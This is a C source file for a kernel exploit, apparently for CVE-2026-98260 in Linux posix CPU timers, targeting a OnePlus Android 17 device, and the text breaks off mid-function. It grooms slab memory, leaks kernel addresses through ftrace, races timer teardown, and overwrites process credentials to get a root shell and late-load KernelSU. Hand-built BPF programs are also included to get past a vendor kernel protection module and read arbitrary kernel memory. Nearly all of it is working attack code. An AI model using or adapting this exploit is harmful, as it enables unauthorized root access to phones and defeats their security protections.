/*
 * Packaged PD2454 adaptation: see README.md for the exact validated target.
 * The historical upstream banner below describes its original port.
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : OnePlus PLZ110 (SM8850 / canoe), Android 17
 * Kernel : 6.12.69-android16-6-g242e1a07f878-ab15865446-4k
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * The trigger, slab layout and offsets are the same; the do_timer_create
 * call site and the tracefs event ids are per-build and are re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android15-6.6 module.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192

/* Per-build target values (multi-kernel table; see targets.h). */
#include "targets.h"
#include "kernel_module_state.h"

/* OOS7 hooks_defend neutralize rendezvous (child posts the module .bss
 * base for the parent, which holds the kernel-write primitive). */
#define HKD_BASE_PATH "/data/local/tmp/hkd_base"
#define HKD_GO_PATH   "/data/local/tmp/hkd_go"
#define HKD_OPEN_PATH "/data/local/tmp/hkd_open"
#define HKD_NAME "[hooks_defend]"

static const struct target *g_t;

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
static int g_debug_logging;
static pid_t g_runner_pid;
static int g_child_entry;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;
    char line[8192];
    size_t prefix = (g_child_entry || getpid() != g_runner_pid) ? 7 : 0;
    if (prefix)
        memcpy(line, "child: ", prefix);
    va_start(ap, fmt);
    int n = vsnprintf(line + prefix, sizeof(line) - prefix, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    size_t total = prefix + (size_t)n;
    if (total >= sizeof(line))
        total = sizeof(line) - 1;
    size_t sent = 0;
    while (sent < total) {
        ssize_t written = write(STDOUT_FILENO, line + sent, total - sent);
        if (written < 0 && errno == EINTR)
            continue;
        if (written <= 0)
            break;
        sent += (size_t)written;
    }
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static int copy_file(const char *src, const char *dst)
{
    char buf[8192];
    int in = open(src, O_RDONLY | O_CLOEXEC);
    if (in < 0)
        return -1;
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (out < 0)
    {
        close(in);
        return -1;
    }
    ssize_t n;
    while ((n = read(in, buf, sizeof(buf))) > 0)
    {
        if (write(out, buf, (size_t)n) != n)
        {
            close(in);
            close(out);
            return -1;
        }
    }
    close(in);
    close(out);
    return n < 0 ? -1 : 0;
}
static void chcon_system(const char *path)
{
    pid_t c = fork();
    if (c == 0)
    {
        execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
              path, (char *)NULL);
        _exit(127);
    }
    if (c > 0)
    {
        int st;
        while (waitpid(c, &st, 0) < 0 && errno == EINTR)
            ;
    }
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
            req != 0x1640 && alloc != 0x1640)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 25000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

extern char **environ;
static void write_ksu_script(void);
static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/* Parked/zombie-holding processes must never be picked by lmkd: init reaping
 * a stale timer node can panic the kernel. Make this process oom-immune from
 * the first second of the campaign (shell-uid processes are prime lmkd
 * candidates under memory pressure -- observed killing parked holders). */
static void oom_protect_self(void)
{
    int fd = open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);

    if (fd < 0)
    {
        logf("[!] oom_score_adj not writable (errno=%d)\n", errno);
        return;
    }
    if (write(fd, "-1000", 5) == 5)
        logf("[+] oom_score_adj=-1000 (lmkd-immune)\n");
    else
        logf("[!] oom_score_adj write failed (errno=%d)\n", errno);
    close(fd);
}

/* OOS7 only: the guard ("hks-dfd") evaluates the kallsyms mask at OPEN
 * time (kallsyms_open stores kallsyms_show_value(f_cred) into the
 * iterator; verified in vmlinux-oos7) and its kallsyms_open/modules_open/
 * module_sect_read pre handlers re-pin kptr_restrict from a saved copy
 * BEFORE that evaluation -- so both a held fd and a fresh open stay
 * masked regardless of ordering.  The one un-hooked consumer of module
 * kallsyms is the BPF helper bpf_kallsyms_lookup_name (func id 0xb3 on
 * this kernel), exposed to sleepable BPF_PROG_TYPE_SYSCALL programs
 * (syscall_prog_func_proto case 0xb3, verified in vmlinux-oos7) which run
 * directly from userspace via BPF_PROG_RUN in the caller's context.  The
 * helper resolves ANY kallsyms symbol name -- including module-local $d
 * markers -- into a map value, gated only by a LIVE
 * kallsyms_show_value(current_cred()) check at helper-call time.
 *
 * So during the parent's kptr_restrict==0 zero-write window (perf_event_
 * paranoid is -1, so the case-0 path passes for ANY cred), the child
 * resolves the guard's own .bss/.data anchors by name with a tight
 * BPF_PROG_RUN poll -- no kallsyms open, no tracefs, no module path:
 * nothing the guard probes is ever touched. */
#define BPF_NR 280 /* arm64 __NR_bpf */

struct bpf_insn_k
{
    uint8_t code;
    uint8_t dst_reg : 4;
    uint8_t src_reg : 4;
    int16_t off;
    int32_t imm;
};

/* minimal attr views for the three commands used */
struct bpf_attr_map_k
{
    uint32_t map_type;
    uint32_t key_size;
    uint32_t value_size;
    uint32_t max_entries;
    uint32_t map_flags;
};

struct bpf_attr_elem_k
{
    uint32_t map_fd;
    uint64_t key;
    uint64_t value_or_next_key;
    uint64_t flags;
};

struct bpf_attr_prog_k
{
    uint32_t prog_type;
    uint32_t insn_cnt;
    uint64_t insns;
    uint64_t license;
    uint32_t log_level;
    uint32_t log_size;
    uint64_t log_buf;
    uint32_t kern_version;
    uint32_t prog_flags;
};

union bpf_attr_k
{
    struct bpf_attr_map_k map;
    struct bpf_attr_elem_k elem;
    struct bpf_attr_prog_k prog;
    unsigned char raw[128];
};

static long bpf_syscall_k(int cmd, union bpf_attr_k *attr, size_t size)
{
    return syscall(BPF_NR, cmd, attr, size);
}

/* map value layout (96 bytes), one BPF_PROG_RUN per operation:
 *   [0..23]  symbol name          [24..27] namelen (0 = skip lookup)
 *   [28..31] mode: 0 none, 1 read raw addr, 2 read resolved+delta
 *   [40..47] lookup result        [48..55] read result (8 bytes)
 *   [56..63] raw src address      [64..71] delta
 *   [72..79] lookup rc            [80..87] read rc
 * Live-validated on the device (see bin/kwalk): helper 0xb3 resolves
 * names (kptr window), helper 0x71 reads any kernel address (gated
 * only by capable(CAP_SYS_ADMIN), which the fake full-caps cred with
 * init_user_ns passes; the guard hooks nothing on this path). */
#define HKD_VALUE_SIZE 96
#define HKD_RES_ADDR 40
#define HKD_RES_READ 48
#define HKD_RAW_ADDR 56
#define HKD_DELTA 64
#define HKD_LOOKUP_RC 72
#define HKD_READ_RC 80

/* returns (map_fd << 16) | prog_fd, or -1 */
static int hkd_bpf_setup(void)
{
    static const char license[] = "GPL";
    union bpf_attr_k a;
    struct bpf_insn_k i[40];
    char log[16384];
    int mfd, pfd;

    memset(&a, 0, sizeof(a));
    a.map.map_type = 2;  /* BPF_MAP_TYPE_ARRAY */
    a.map.key_size = 4;
    a.map.value_size = HKD_VALUE_SIZE;
    a.map.max_entries = 1;
    mfd = (int)bpf_syscall_k(0 /* MAP_CREATE */, &a, sizeof(a.map));
    if (mfd < 0)
    {
        logf("[!] hkd: bpf map create: %s\n", strerror(errno));
        return -1;
    }

    /* r1 = map_value; r9 = r1 (base; r1-r5 are clobbered by calls)
     * if (namelen & 31) { r3 = 0; r4 = r1 + 40; r0 = call 0xb3; r6 = r0 }
     * else r6 = -1
     * *(u64 *)(r9 + 72) = r6
     * mode = *(u32 *)(r9 + 28) & 3
     * if (mode == 0) exit
     * if (mode == 1) r3 = *(u64 *)(r9 + 56)
     * else { r3 = *(u64 *)(r9 + 40); r3 += *(u64 *)(r9 + 64) }
     * r1 = r9 + 48 (dst); r2 = 8; call 0x71 (probe_read_kernel)
     * *(u64 *)(r9 + 80) = r0 */
    memset(i, 0, sizeof(i));
    i[0].code = 0x18; i[0].dst_reg = 1; i[0].src_reg = 2; i[0].imm = mfd;
    i[1].imm = 0;
    i[2].code = 0xbf; i[2].dst_reg = 9; i[2].src_reg = 1;
    i[3].code = 0x61; i[3].dst_reg = 2; i[3].src_reg = 1; i[3].off = 24;
    i[4].code = 0x57; i[4].dst_reg = 2; i[4].imm = 31;
    i[5].code = 0x15; i[5].dst_reg = 2; i[5].off = 6; i[5].imm = 0;
    i[6].code = 0xb7; i[6].dst_reg = 3;
    i[7].code = 0xbf; i[7].dst_reg = 4; i[7].src_reg = 1;
    i[8].code = 0x07; i[8].dst_reg = 4; i[8].imm = 40;
    i[9].code = 0x85; i[9].imm = 0xb3; /* bpf_kallsyms_lookup_name */
    i[10].code = 0xbf; i[10].dst_reg = 6; i[10].src_reg = 0;
    i[11].code = 0x05; i[11].off = 2;
    i[12].code = 0xb7; i[12].dst_reg = 6; i[12].imm = -1;
    i[13].code = 0xb7; i[13].dst_reg = 0; /* gap filler, no-lookup path */
    i[14].code = 0x7b; i[14].dst_reg = 9; i[14].src_reg = 6; i[14].off = 72;
    i[15].code = 0x61; i[15].dst_reg = 7; i[15].src_reg = 9; i[15].off = 28;
    i[16].code = 0x57; i[16].dst_reg = 7; i[16].imm = 3;
    i[17].code = 0x15; i[17].dst_reg = 7; i[17].off = 14; i[17].imm = 0;
    i[18].code = 0x15; i[18].dst_reg = 7; i[18].off = 4; i[18].imm = 1;
    i[19].code = 0x79; i[19].dst_reg = 3; i[19].src_reg = 9; i[19].off = 40;
    i[20].code = 0x79; i[20].dst_reg = 8; i[20].src_reg = 9; i[20].off = 64;
    i[21].code = 0x0f; i[21].dst_reg = 3; i[21].src_reg = 8;
    i[22].code = 0x05; i[22].off = 1;
    i[23].code = 0x79; i[23].dst_reg = 3; i[23].src_reg = 9; i[23].off = 56;
    i[24].code = 0xbf; i[24].dst_reg = 1; i[24].src_reg = 9;
    i[25].code = 0x07; i[25].dst_reg = 1; i[25].imm = 48;
    i[26].code = 0xb7; i[26].dst_reg = 2; i[26].imm = 8;
    i[27].code = 0x85; i[27].imm = 0x71; /* bpf_probe_read_kernel */
    i[28].code = 0xbf; i[28].dst_reg = 7; i[28].src_reg = 0;
    i[29].code = 0x7b; i[29].dst_reg = 9; i[29].src_reg = 7; i[29].off = 80;
    i[30].code = 0xb7; i[30].dst_reg = 0;
    i[31].code = 0x95;
    i[32].code = 0xb7; i[32].dst_reg = 0;
    i[33].code = 0x95;

    memset(&a, 0, sizeof(a));
    a.prog.prog_type = 31; /* BPF_PROG_TYPE_SYSCALL */
    a.prog.prog_flags = 16; /* BPF_F_SLEEPABLE (required) */
    a.prog.insn_cnt = 34;
    a.prog.insns = (uint64_t)(uintptr_t)i;
    a.prog.license = (uint64_t)(uintptr_t)license;
    a.prog.log_level = 1;
    a.prog.log_size = sizeof(log);
    a.prog.log_buf = (uint64_t)(uintptr_t)log;
    pfd = (int)bpf_syscall_k(5 /* PROG_LOAD */, &a, sizeof(a.prog));
    if (pfd < 0)
    {
        log[sizeof(log) - 1] = 0;
        logf("[!] hkd: bpf prog load: %s log-tail: %.512s\n",
             strerror(errno),
